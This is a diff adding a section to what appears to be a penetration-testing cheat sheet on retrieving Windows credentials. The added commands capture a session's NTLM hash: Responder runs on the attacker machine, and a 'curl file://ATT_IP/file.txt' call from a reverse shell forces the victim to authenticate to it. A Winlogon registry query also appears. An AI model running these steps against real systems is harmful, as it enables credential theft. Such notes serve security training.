@@ -91,6 +91,8 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 
 </details>
 
+
+
 ### Retrive from Softwares
 
 <details>
@@ -108,6 +110,32 @@ Simon Tatham is the creator of PuTTY (and his name is part of the path), not the
 {% endhint %}
 
 </details>
+
+
+
+### Retrive from Revshell session
+
+<details>
+
+<summary>NTLM stealing with responder</summary>
+
+Try to steal NTLM of the current session.
+
+{% code title="attacker machine" %}
+```bash
+responder -I tun0
+```
+{% endcode %}
+
+{% code title="revshell session" %}
+```powershell
+curl file://ATT_IP/file.txt
+```
+{% endcode %}
+
+</details>
+
+
 
 
 
